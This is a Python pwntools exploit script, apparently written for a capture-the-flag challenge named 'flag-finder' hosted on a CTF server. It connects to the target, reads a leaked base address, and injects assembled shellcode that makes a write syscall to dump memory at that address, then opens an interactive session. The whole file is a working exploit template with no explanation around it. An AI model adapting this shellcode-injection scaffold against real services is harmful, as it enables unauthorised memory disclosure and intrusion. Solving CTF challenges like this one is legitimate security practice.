#!/usr/bin/python3

from pwn import *

exe = ELF('flag-finder', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x4014FE  

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30012)
else:
        p = process(exe.path)

GDB()
p.recvuntil(b'starting from ')
base = int(p.recvline(keepends=False), 16)
info("base: " + hex(base))
payload = asm(f"""
              mov rdi, 1
              mov rsi, {base}
              mov rdx, 0x1000
              mov rax, 0x1
              syscall
              """)
sla(b'> ', payload)
p.interactive()
